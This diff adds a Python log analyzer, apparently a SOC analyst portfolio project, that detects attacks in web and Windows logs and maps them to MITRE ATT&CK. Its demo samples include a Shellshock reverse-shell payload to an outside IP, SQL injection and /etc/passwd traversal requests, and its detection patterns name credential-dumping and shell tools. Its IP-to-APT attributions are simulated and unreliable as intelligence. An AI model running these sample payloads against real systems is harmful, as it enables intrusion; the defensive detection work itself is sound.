@@ -1,0 +1,629 @@
+#!/usr/bin/env python3
+"""
+SOC Analyst Portfolio - SIEM Log Analyzer
+=========================================
+Parses raw log files, detects threats, and generates structured IOC reports.
+Supports: Apache/Nginx, Windows Event Logs, Syslog, Firewall logs
+
+Author: [Your Name]
+LinkedIn: [Your LinkedIn]
+GitHub: [Your GitHub]
+"""
+
+import re
+import json
+import hashlib
+import ipaddress
+from datetime import datetime, timezone
+from collections import defaultdict, Counter
+from pathlib import Path
+from dataclasses import dataclass, asdict, field
+from typing import Optional
+import argparse
+import sys
+
+# ──────────────────────────────────────────
+# THREAT INTELLIGENCE FEEDS (simulated)
+# ──────────────────────────────────────────
+KNOWN_MALICIOUS_IPS = {
+    "185.220.101.47": {"actor": "APT28", "campaign": "FancyBear-2024", "confidence": 95},
+    "45.33.32.156":   {"actor": "FIN7",  "campaign": "Carbanak-v3",    "confidence": 87},
+    "218.92.0.31":    {"actor": "APT10", "campaign": "CloudHopper",    "confidence": 92},
+    "103.234.158.34": {"actor": "Lazarus","campaign": "BlueNoroff",    "confidence": 89},
+}
+
+SUSPICIOUS_USER_AGENTS = [
+    "sqlmap", "nikto", "nmap", "masscan", "hydra",
+    "python-requests", "curl/", "go-http-client", "zgrab",
+    "dirbuster", "gobuster", "wfuzz", "burpsuite",
+]
+
+MALICIOUS_PATTERNS = {
+    "sql_injection":     r"(?i)('|\"|;|--|union\s+select|or\s+1=1|drop\s+table|insert\s+into)",
+    "xss":               r"(?i)(<script|javascript:|onerror=|onload=|alert\(|document\.cookie)",
+    "path_traversal":    r"(\.\./|\.\.\\|%2e%2e|%252e%252e)",
+    "cmd_injection":     r"(?i)(;|\||&|`|\$\()(ls|cat|whoami|id|uname|curl|wget|bash|sh)",
+    "log4j":             r"(?i)\$\{(jndi|lower|upper|::-)",
+    "shellshock":        r"\(\)\s*\{[^}]*\}\s*;",
+    "mimikatz":          r"(?i)(mimikatz|sekurlsa|lsadump|kerberos::)",
+    "powershell_enc":    r"(?i)(powershell.*-enc|-encodedcommand|frombase64string)",
+    "credential_dump":   r"(?i)(lsass\.exe|SAM.*SYSTEM|ntds\.dit|credential)",
+}
+
+MITRE_MAPPING = {
+    "sql_injection":    {"tactic": "Initial Access",   "technique": "T1190", "name": "Exploit Public-Facing Application"},
+    "xss":              {"tactic": "Execution",        "technique": "T1059.007", "name": "JavaScript Execution"},
+    "path_traversal":   {"tactic": "Discovery",        "technique": "T1083", "name": "File and Directory Discovery"},
+    "cmd_injection":    {"tactic": "Execution",        "technique": "T1059", "name": "Command and Scripting Interpreter"},
+    "log4j":            {"tactic": "Initial Access",   "technique": "T1190", "name": "CVE-2021-44228 Log4Shell"},
+    "shellshock":       {"tactic": "Initial Access",   "technique": "T1190", "name": "CVE-2014-6271 Shellshock"},
+    "mimikatz":         {"tactic": "Credential Access","technique": "T1003", "name": "OS Credential Dumping"},
+    "powershell_enc":   {"tactic": "Defense Evasion",  "technique": "T1027", "name": "Obfuscated Files or Information"},
+    "credential_dump":  {"tactic": "Credential Access","technique": "T1003", "name": "LSASS Memory Dump"},
+}
+
+
+# ──────────────────────────────────────────
+# DATA CLASSES
+# ──────────────────────────────────────────
+@dataclass
+class Alert:
+    alert_id: str
+    severity: str          # CRITICAL / HIGH / MEDIUM / LOW
+    category: str
+    timestamp: str
+    source_ip: str
+    destination: str
+    description: str
+    raw_log: str
+    mitre_technique: Optional[str] = None
+    mitre_tactic: Optional[str] = None
+    threat_actor: Optional[str] = None
+    confidence: int = 0
+    tags: list = field(default_factory=list)
+    recommended_action: str = ""
+
+
+@dataclass
+class IOC:
+    ioc_type: str          # IP / DOMAIN / URL / SHA256 / EMAIL
+    value: str
+    first_seen: str
+    last_seen: str
+    hit_count: int
+    source_logs: list
+    threat_actor: Optional[str] = None
+    confidence: int = 0
+    status: str = "active" # active / blocked / monitoring
+
+
+@dataclass
+class IncidentReport:
+    report_id: str
+    generated_at: str
+    period_start: str
+    period_end: str
+    total_events: int
+    total_alerts: int
+    critical_count: int
+    high_count: int
+    medium_count: int
+    low_count: int
+    top_source_ips: list
+    top_attack_types: list
+    iocs_discovered: list
+    mitre_techniques: list
+    recommendations: list
+
+
+# ──────────────────────────────────────────
+# LOG PARSERS
+# ──────────────────────────────────────────
+class LogParser:
+    """Base class for all log format parsers."""
+
+    # Apache/Nginx Combined Log Format
+    APACHE_PATTERN = re.compile(
+        r'(?P<ip>[\d.]+)\s+-\s+-\s+\[(?P<time>[^\]]+)\]\s+'
+        r'"(?P<method>\w+)\s+(?P<path>[^\s]+)\s+HTTP/[\d.]+"\s+'
+        r'(?P<status>\d+)\s+(?P<size>\d+|-)\s+'
+        r'"(?P<referrer>[^"]+)"\s+"(?P<ua>[^"]+)"'
+    )
+
+    # Windows Event Log (simplified structured)
+    WINDOWS_PATTERN = re.compile(
+        r'(?P<timestamp>\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2})\s+'
+        r'EventID=(?P<event_id>\d+)\s+Level=(?P<level>\w+)\s+'
+        r'Source=(?P<source>[^\s]+)\s+Message=(?P<message>.+)'
+    )
+
+    # Syslog RFC 3164
+    SYSLOG_PATTERN = re.compile(
+        r'(?P<month>\w+)\s+(?P<day>\d+)\s+(?P<time>\d{2}:\d{2}:\d{2})\s+'
+        r'(?P<host>[^\s]+)\s+(?P<process>[^\[:]+)(?:\[(?P<pid>\d+)\])?:\s+(?P<message>.+)'
+    )
+
+    # Firewall log
+    FIREWALL_PATTERN = re.compile(
+        r'(?P<timestamp>\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2})\s+'
+        r'(?P<action>ALLOW|DENY|DROP)\s+(?P<proto>TCP|UDP|ICMP)\s+'
+        r'src=(?P<src_ip>[\d.]+):(?P<src_port>\d+)\s+'
+        r'dst=(?P<dst_ip>[\d.]+):(?P<dst_port>\d+)'
+    )
+
+    @classmethod
+    def parse_apache(cls, line: str) -> Optional[dict]:
+        m = cls.APACHE_PATTERN.match(line.strip())
+        if not m:
+            return None
+        return {
+            "type": "http",
+            "ip": m.group("ip"),
+            "timestamp": m.group("time"),
+            "method": m.group("method"),
+            "path": m.group("path"),
+            "status": int(m.group("status")),
+            "user_agent": m.group("ua"),
+            "raw": line.strip()
+        }
+
+    @classmethod
+    def parse_windows_event(cls, line: str) -> Optional[dict]:
+        m = cls.WINDOWS_PATTERN.match(line.strip())
+        if not m:
+            return None
+        return {
+            "type": "windows_event",
+            "timestamp": m.group("timestamp"),
+            "event_id": int(m.group("event_id")),
+            "level": m.group("level"),
+            "source": m.group("source"),
+            "message": m.group("message"),
+            "raw": line.strip()
+        }
+
+    @classmethod
+    def parse_firewall(cls, line: str) -> Optional[dict]:
+        m = cls.FIREWALL_PATTERN.match(line.strip())
+        if not m:
+            return None
+        return {
+            "type": "firewall",
+            "timestamp": m.group("timestamp"),
+            "action": m.group("action"),
+            "protocol": m.group("proto"),
+            "src_ip": m.group("src_ip"),
+            "src_port": int(m.group("src_port")),
+            "dst_ip": m.group("dst_ip"),
+            "dst_port": int(m.group("dst_port")),
+            "raw": line.strip()
+        }
+
+
+# ──────────────────────────────────────────
+# DETECTION ENGINE
+# ──────────────────────────────────────────
+class ThreatDetectionEngine:
+    """
+    Core detection engine implementing:
+    - Signature-based detection (regex patterns)
+    - Threshold-based anomaly detection (brute force, port scans)
+    - Threat intelligence correlation
+    - MITRE ATT&CK mapping
+    """
+
+    def __init__(self):
+        self.alerts: list[Alert] = []
+        self.ioc_tracker: dict[str, IOC] = {}
+        self.ip_attempt_tracker: dict[str, list] = defaultdict(list)
+        self.event_counter: Counter = Counter()
+        self._alert_counter = 0
+
+    def _next_id(self) -> str:
+        self._alert_counter += 1
+        return f"ALERT-{datetime.now().strftime('%Y%m%d')}-{self._alert_counter:04d}"
+
+    def _make_ioc(self, ioc_type: str, value: str, log_line: str,
+                  actor: str = None, confidence: int = 50):
+        now = datetime.now(timezone.utc).isoformat()
+        if value in self.ioc_tracker:
+            ioc = self.ioc_tracker[value]
+            ioc.hit_count += 1
+            ioc.last_seen = now
+            ioc.source_logs.append(log_line[:120])
+        else:
+            self.ioc_tracker[value] = IOC(
+                ioc_type=ioc_type,
+                value=value,
+                first_seen=now,
+                last_seen=now,
+                hit_count=1,
+                source_logs=[log_line[:120]],
+                threat_actor=actor,
+                confidence=confidence,
+            )
+
+    def _check_threat_intel(self, ip: str) -> Optional[dict]:
+        """Correlate IP against threat intelligence feeds."""
+        return KNOWN_MALICIOUS_IPS.get(ip)
+
+    def _check_patterns(self, text: str) -> list[tuple[str, dict]]:
+        """Match text against all malicious patterns."""
+        hits = []
+        for pattern_name, regex in MALICIOUS_PATTERNS.items():
+            if re.search(regex, text):
+                hits.append((pattern_name, MITRE_MAPPING.get(pattern_name, {})))
+        return hits
+
+    def analyze_http_log(self, entry: dict) -> list[Alert]:
+        """Analyze a parsed HTTP log entry for threats."""
+        new_alerts = []
+        ip = entry.get("ip", "")
+        path = entry.get("path", "")
+        ua = entry.get("user_agent", "")
+        status = entry.get("status", 200)
+        now = datetime.now(timezone.utc).isoformat()
+
+        self.event_counter["http"] += 1
+
+        # 1. Threat Intel Check
+        ti_hit = self._check_threat_intel(ip)
+        if ti_hit:
+            alert = Alert(
+                alert_id=self._next_id(),
+                severity="CRITICAL",
+                category="Threat Intel Hit",
+                timestamp=now,
+                source_ip=ip,
+                destination=entry.get("path", ""),
+                description=f"Known malicious IP {ip} identified as {ti_hit['actor']} "
+                            f"(campaign: {ti_hit['campaign']})",
+                raw_log=entry["raw"],
+                threat_actor=ti_hit["actor"],
+                confidence=ti_hit["confidence"],
+                mitre_technique="T1566",
+                mitre_tactic="Initial Access",
+                tags=["threat-intel", "apt", ti_hit["actor"].lower()],
+                recommended_action=f"Block IP {ip} at firewall. Investigate all sessions from this IP. "
+                                   f"Escalate to Tier 2. Check for lateral movement."
+            )
+            new_alerts.append(alert)
+            self._make_ioc("IP", ip, entry["raw"], ti_hit["actor"], ti_hit["confidence"])
+
+        # 2. Suspicious User-Agent
+        ua_lower = ua.lower()
+        for bad_ua in SUSPICIOUS_USER_AGENTS:
+            if bad_ua in ua_lower:
+                alert = Alert(
+                    alert_id=self._next_id(),
+                    severity="HIGH",
+                    category="Reconnaissance Tool",
+                    timestamp=now,
+                    source_ip=ip,
+                    destination=path,
+                    description=f"Automated attack tool detected: '{bad_ua}' in User-Agent from {ip}",
+                    raw_log=entry["raw"],
+                    confidence=85,
+                    mitre_technique="T1595",
+                    mitre_tactic="Reconnaissance",
+                    tags=["scanning", "recon", bad_ua.split('/')[0]],
+                    recommended_action=f"Rate-limit {ip}. Review full session. Consider blocking."
+                )
+                new_alerts.append(alert)
+                self._make_ioc("IP", ip, entry["raw"], confidence=75)
+                break
+
+        # 3. Attack Pattern Detection
+        full_request = f"{path} {ua}"
+        pattern_hits = self._check_patterns(full_request)
+        for pattern_name, mitre_info in pattern_hits:
+            severity = "CRITICAL" if pattern_name in ("log4j", "shellshock", "mimikatz") else "HIGH"
+            alert = Alert(
+                alert_id=self._next_id(),
+                severity=severity,
+                category=pattern_name.replace("_", " ").title(),
+                timestamp=now,
+                source_ip=ip,
+                destination=path,
+                description=f"Attack pattern '{pattern_name}' detected in request from {ip}",
+                raw_log=entry["raw"],
+                confidence=90,
+                mitre_technique=mitre_info.get("technique"),
+                mitre_tactic=mitre_info.get("tactic"),
+                tags=["attack", pattern_name],
+                recommended_action=f"Block request, investigate IP {ip}, "
+                                   f"check for successful exploitation ({status} response code)."
+            )
+            new_alerts.append(alert)
+
+        # 4. Brute Force Detection (track 401s)
+        if status in (401, 403):
+            self.ip_attempt_tracker[ip].append(now)
+            # Keep only last 5 minutes (simplified)
+            if len(self.ip_attempt_tracker[ip]) >= 10:
+                alert = Alert(
+                    alert_id=self._next_id(),
+                    severity="HIGH",
+                    category="Brute Force",
+                    timestamp=now,
+                    source_ip=ip,
+                    destination=path,
+                    description=f"Brute force attempt: {len(self.ip_attempt_tracker[ip])} "
+                                f"failed auth attempts from {ip}",
+                    raw_log=entry["raw"],
+                    confidence=88,
+                    mitre_technique="T1110",
+                    mitre_tactic="Credential Access",
+                    tags=["brute-force", "credential-access"],
+                    recommended_action=f"Temporarily block {ip}. Enable MFA. Review account lockout policy."
+                )
+                new_alerts.append(alert)
+                self.ip_attempt_tracker[ip] = []  # reset
+
+        self.alerts.extend(new_alerts)
+        return new_alerts
+
+    def analyze_windows_event(self, entry: dict) -> list[Alert]:
+        """Analyze Windows Event Log entries for security events."""
+        new_alerts = []
+        now = datetime.now(timezone.utc).isoformat()
+        eid = entry.get("event_id", 0)
+        msg = entry.get("message", "")
+
+        # Critical Windows Security Events
+        CRITICAL_EVENT_IDS = {
+            4624: ("Successful Logon", "LOW", "T1078", "Defense Evasion"),
+            4625: ("Failed Logon", "MEDIUM", "T1110", "Credential Access"),
+            4648: ("Logon with Explicit Credentials", "HIGH", "T1134", "Privilege Escalation"),
+            4688: ("Process Creation", "MEDIUM", "T1059", "Execution"),
+            4697: ("Service Installed", "HIGH", "T1543", "Persistence"),
+            4720: ("User Account Created", "HIGH", "T1136", "Persistence"),
+            4728: ("User Added to Privileged Group", "CRITICAL", "T1078.002", "Privilege Escalation"),
+            4776: ("Credential Validation", "MEDIUM", "T1110", "Credential Access"),
+            7045: ("New Service Installed", "HIGH", "T1543.003", "Persistence"),
+        }
+
+        if eid in CRITICAL_EVENT_IDS:
+            desc, sev, tech, tactic = CRITICAL_EVENT_IDS[eid]
+            # Escalate severity for suspicious process names
+            pattern_hits = self._check_patterns(msg)
+            if pattern_hits:
+                sev = "CRITICAL"
+
+            alert = Alert(
+                alert_id=self._next_id(),
+                severity=sev,
+                category=f"Windows Event {eid}: {desc}",
+                timestamp=now,
+                source_ip=entry.get("source", ""),
+                destination="Windows Host",
+                description=f"Security event {eid} ({desc}): {msg[:200]}",
+                raw_log=entry["raw"],
+                confidence=80,
+                mitre_technique=tech,
+                mitre_tactic=tactic,
+                tags=["windows", f"event-{eid}"],
+                recommended_action=f"Investigate source of Event ID {eid}. "
+                                   f"Correlate with other events from same host/time."
+            )
+            new_alerts.append(alert)
+
+        self.alerts.extend(new_alerts)
+        return new_alerts
+
+    def get_summary(self) -> dict:
+        """Generate executive summary of all detections."""
+        severity_counts = Counter(a.severity for a in self.alerts)
+        tactic_counts = Counter(a.mitre_tactic for a in self.alerts if a.mitre_tactic)
+        top_ips = Counter(a.source_ip for a in self.alerts).most_common(10)
+
+        return {
+            "total_alerts": len(self.alerts),
+            "severity_breakdown": dict(severity_counts),
+            "top_source_ips": top_ips,
+            "top_tactics": tactic_counts.most_common(5),
+            "total_iocs": len(self.ioc_tracker),
+            "unique_threat_actors": list({a.threat_actor for a in self.alerts if a.threat_actor}),
+        }
+
+
+# ──────────────────────────────────────────
+# REPORT GENERATOR
+# ──────────────────────────────────────────
+class ReportGenerator:
+    """Generates structured incident reports in JSON and Markdown."""
+
+    @staticmethod
+    def to_json(engine: ThreatDetectionEngine, output_path: str = "report.json"):
+        data = {
+            "generated_at": datetime.now(timezone.utc).isoformat(),
+            "summary": engine.get_summary(),
+            "alerts": [asdict(a) for a in engine.alerts],
+            "iocs": [asdict(i) for i in engine.ioc_tracker.values()],
+        }
+        with open(output_path, "w") as f:
+            json.dump(data, f, indent=2, default=str)
+        print(f"[+] JSON report saved: {output_path}")
+        return data
+
+    @staticmethod
+    def to_markdown(engine: ThreatDetectionEngine, output_path: str = "report.md"):
+        summary = engine.get_summary()
+        lines = [
+            "# 🛡 SOC Incident Analysis Report",
+            f"\n**Generated:** {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M UTC')}  ",
+            f"**Analyst Tool:** SIEM Log Analyzer v1.0  \n",
+            "---",
+            "\n## Executive Summary\n",
+            f"| Metric | Value |",
+            f"|--------|-------|",
+            f"| Total Alerts | **{summary['total_alerts']}** |",
+            f"| Critical | 🔴 {summary['severity_breakdown'].get('CRITICAL', 0)} |",
+            f"| High | 🟠 {summary['severity_breakdown'].get('HIGH', 0)} |",
+            f"| Medium | 🟡 {summary['severity_breakdown'].get('MEDIUM', 0)} |",
+            f"| Total IOCs | {summary['total_iocs']} |",
+            f"| Threat Actors | {', '.join(summary['unique_threat_actors']) or 'N/A'} |",
+            "\n---",
+            "\n## Critical Alerts\n",
+        ]
+
+        for alert in [a for a in engine.alerts if a.severity == "CRITICAL"][:10]:
+            lines += [
+                f"### 🚨 {alert.alert_id} — {alert.category}",
+                f"- **Severity:** {alert.severity}",
+                f"- **Source IP:** `{alert.source_ip}`",
+                f"- **Description:** {alert.description}",
+                f"- **MITRE:** [{alert.mitre_technique}](https://attack.mitre.org/techniques/{alert.mitre_technique.replace('.','/')}/)" if alert.mitre_technique else "",
+                f"- **Recommended Action:** {alert.recommended_action}",
+                "",
+            ]
+
+        lines += ["\n---", "\n## Indicators of Compromise\n",
+                  "| Type | Value | Threat Actor | Confidence | Status |",
+                  "|------|-------|-------------|------------|--------|"]
+        for ioc in list(engine.ioc_tracker.values())[:20]:
+            lines.append(f"| {ioc.ioc_type} | `{ioc.value}` | {ioc.threat_actor or 'Unknown'} | {ioc.confidence}% | {ioc.status} |")
+
+        lines += ["\n---", "\n## Recommendations\n",
+                  "1. **Immediately block** all Critical severity source IPs at the perimeter firewall.",
+                  "2. **Enable MFA** on all externally accessible services (VPN, RDP, SSH, Web Apps).",
+                  "3. **Patch immediately**: Review CVEs detected (Log4Shell, Shellshock) on all systems.",
+                  "4. **Hunt for compromise**: Run threat hunting queries for all CRITICAL alert IOCs.",
+                  "5. **Update SIEM rules**: Add new signatures from this report to detection engine.",
+                  "6. **Review EDR alerts**: Correlate endpoint telemetry with network findings.",
+                  "\n---",
+                  "\n*Report generated by SOC Analyst Portfolio — SIEM Log Analyzer*  ",
+                  "*Tool by [Your Name] | MITRE ATT&CK® is a trademark of The MITRE Corporation*"]
+
+        with open(output_path, "w") as f:
+            f.write("\n".join(lines))
+        print(f"[+] Markdown report saved: {output_path}")
+
+
+# ──────────────────────────────────────────
+# SAMPLE LOG GENERATOR (for demo)
+# ──────────────────────────────────────────
+SAMPLE_LOGS = """185.220.101.47 - - [15/Jan/2024:02:14:33 +0000] "GET /admin/config.php HTTP/1.1" 403 512 "-" "python-requests/2.28.0"
+192.168.1.100 - - [15/Jan/2024:02:14:35 +0000] "GET /index.html HTTP/1.1" 200 1024 "-" "Mozilla/5.0"
+10.0.0.50 - - [15/Jan/2024:02:14:40 +0000] "POST /login HTTP/1.1" 401 256 "-" "sqlmap/1.7.2"
+218.92.0.31 - - [15/Jan/2024:02:14:41 +0000] "GET /search?q='+OR+1=1-- HTTP/1.1" 200 4096 "-" "Mozilla/5.0"
+185.220.101.47 - - [15/Jan/2024:02:14:42 +0000] "GET /cgi-bin/test.sh HTTP/1.1" 200 128 "-" "() { :;}; /bin/bash -i >& /dev/tcp/185.220.101.47/4444 0>&1"
+10.0.0.51 - - [15/Jan/2024:02:15:01 +0000] "GET /login HTTP/1.1" 401 200 "-" "Mozilla/5.0"
+10.0.0.51 - - [15/Jan/2024:02:15:02 +0000] "GET /login HTTP/1.1" 401 200 "-" "Mozilla/5.0"
+10.0.0.51 - - [15/Jan/2024:02:15:03 +0000] "GET /login HTTP/1.1" 401 200 "-" "Mozilla/5.0"
+10.0.0.51 - - [15/Jan/2024:02:15:04 +0000] "GET /login HTTP/1.1" 401 200 "-" "Mozilla/5.0"
+10.0.0.51 - - [15/Jan/2024:02:15:05 +0000] "GET /login HTTP/1.1" 401 200 "-" "Mozilla/5.0"
+10.0.0.51 - - [15/Jan/2024:02:15:06 +0000] "GET /login HTTP/1.1" 401 200 "-" "Mozilla/5.0"
+10.0.0.51 - - [15/Jan/2024:02:15:07 +0000] "GET /login HTTP/1.1" 401 200 "-" "Mozilla/5.0"
+10.0.0.51 - - [15/Jan/2024:02:15:08 +0000] "GET /login HTTP/1.1" 401 200 "-" "Mozilla/5.0"
+10.0.0.51 - - [15/Jan/2024:02:15:09 +0000] "GET /login HTTP/1.1" 401 200 "-" "Mozilla/5.0"
+10.0.0.51 - - [15/Jan/2024:02:15:10 +0000] "GET /login HTTP/1.1" 401 200 "-" "Mozilla/5.0"
+45.33.32.156 - - [15/Jan/2024:02:16:00 +0000] "GET /download?file=../../../../etc/passwd HTTP/1.1" 200 2048 "-" "curl/7.68.0"
+"""
+
+SAMPLE_WINDOWS_LOGS = """2024-01-15T02:20:00 EventID=4728 Level=Critical Source=Security Message=A member was added to a security-enabled global group. Subject: svc_backup. Group: Domain Admins
+2024-01-15T02:20:05 EventID=4688 Level=Warning Source=Security Message=A new process has been created. Process: mimikatz.exe Parent: cmd.exe User: svc_backup
+2024-01-15T02:20:10 EventID=4625 Level=Warning Source=Security Message=An account failed to log on. Account: Administrator Source: 218.92.0.31
+"""
+
+
+# ──────────────────────────────────────────
+# MAIN
+# ──────────────────────────────────────────
+def main():
+    parser = argparse.ArgumentParser(
+        description="🛡 SOC SIEM Log Analyzer — Threat Detection & IOC Extraction",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog="""
+Examples:
+  python siem_analyzer.py --demo
+  python siem_analyzer.py --log-file access.log --type apache
+  python siem_analyzer.py --log-file events.log --type windows --output report
+        """
+    )
+    parser.add_argument("--demo",       action="store_true", help="Run with built-in sample logs")
+    parser.add_argument("--log-file",   help="Path to log file")
+    parser.add_argument("--type",       choices=["apache","windows","syslog","firewall"], default="apache")
+    parser.add_argument("--output",     default="soc_report", help="Output filename (no extension)")
+    parser.add_argument("--format",     choices=["json","markdown","both"], default="both")
+    args = parser.parse_args()
+
+    print("\n" + "="*60)
+    print("  🛡  SOC ANALYST — SIEM LOG ANALYZER")
+    print("  Threat Detection & IOC Extraction Engine")
+    print("="*60 + "\n")
+
+    engine = ThreatDetectionEngine()
+    parser_obj = LogParser()
+
+    if args.demo:
+        print("[*] Running demo with sample logs...\n")
+        # HTTP logs
+        for line in SAMPLE_LOGS.strip().split("\n"):
+            if not line.strip():
+                continue
+            entry = parser_obj.parse_apache(line)
+            if entry:
+                alerts = engine.analyze_http_log(entry)
+                for a in alerts:
+                    icon = {"CRITICAL":"🔴","HIGH":"🟠","MEDIUM":"🟡","LOW":"🟢"}.get(a.severity,"⚪")
+                    print(f"  {icon} [{a.severity}] {a.alert_id} — {a.category}")
+                    print(f"     Source: {a.source_ip} | MITRE: {a.mitre_technique or 'N/A'}")
+                    print(f"     {a.description[:90]}...")
+                    print()
+
+        # Windows logs
+        for line in SAMPLE_WINDOWS_LOGS.strip().split("\n"):
+            if not line.strip():
+                continue
+            entry = parser_obj.parse_windows_event(line)
+            if entry:
+                alerts = engine.analyze_windows_event(entry)
+                for a in alerts:
+                    icon = {"CRITICAL":"🔴","HIGH":"🟠","MEDIUM":"🟡","LOW":"🟢"}.get(a.severity,"⚪")
+                    print(f"  {icon} [{a.severity}] {a.alert_id} — {a.category}")
+                    print()
+
+    elif args.log_file:
+        log_path = Path(args.log_file)
+        if not log_path.exists():
+            print(f"[!] File not found: {args.log_file}")
+            sys.exit(1)
+        print(f"[*] Analyzing: {args.log_file} ({args.type} format)")
+        with open(log_path) as f:
+            for line in f:
+                if args.type == "apache":
+                    entry = parser_obj.parse_apache(line)
+                    if entry:
+                        engine.analyze_http_log(entry)
+                elif args.type == "windows":
+                    entry = parser_obj.parse_windows_event(line)
+                    if entry:
+                        engine.analyze_windows_event(entry)
+    else:
+        parser.print_help()
+        sys.exit(0)
+
+    # Summary
+    summary = engine.get_summary()
+    print("\n" + "="*60)
+    print("  📊  ANALYSIS COMPLETE")
+    print("="*60)
+    print(f"  Total Alerts  : {summary['total_alerts']}")
+    print(f"  Critical      : {summary['severity_breakdown'].get('CRITICAL', 0)}")
+    print(f"  High          : {summary['severity_breakdown'].get('HIGH', 0)}")
+    print(f"  IOCs Found    : {summary['total_iocs']}")
+    print(f"  Threat Actors : {', '.join(summary['unique_threat_actors']) or 'Unknown'}")
+    print()
+
+    # Reports
+    if args.format in ("json", "both"):
+        ReportGenerator.to_json(engine, f"{args.output}.json")
+    if args.format in ("markdown", "both"):
+        ReportGenerator.to_markdown(engine, f"{args.output}.md")
+
+    print("\n[✓] Analysis complete.\n")
+
+
+if __name__ == "__main__":
+    main()
